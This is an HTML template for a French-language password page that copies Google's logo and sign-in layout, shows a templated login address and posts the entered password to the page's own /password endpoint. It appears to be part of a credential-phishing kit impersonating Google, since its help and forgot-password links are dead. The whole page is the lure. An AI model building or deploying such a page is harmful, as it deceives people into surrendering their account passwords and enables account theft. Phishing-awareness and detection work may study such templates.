<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mot de passe</title>
    <link rel="stylesheet" href="/static/styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght=300;400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <svg focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="74" height="24">
                    <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
                    <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
                    <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
                    <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>
                    <path fill="none" d="M1 1h22v22H1z"></path>
                </svg>
            </div>
            <h1>Bienvenue</h1>
            <form method="post" action="/password">
                <div class="email-group">
                    <p id="email-display">{{ login }}</p>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="" required />
                    <label for="password">Saisissez votre mot de passe</label>
                </div>
                <div class="show-password-group">
                    <input type="checkbox" id="show-password">
                    <label for="show-password">Afficher le mot de passe</label>
                </div>
                <div class="forgot-password">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
                <div class="button-group">
                    <button type="submit" class="button next-button">Suivant</button>
                </div>
            </form>
        </div>
        <div class="language-selector">
            <span>Français (France)</span>
            <label>
                <select>
                    <option>Français (France)</option>
                </select>
            </label>
        </div>
        <div class="footer-links">
            <a href="#">Aide</a>
            <a href="#">Confidentialité</a>
            <a href="#">Conditions</a>
        </div>
    </div>
</body>
</html>
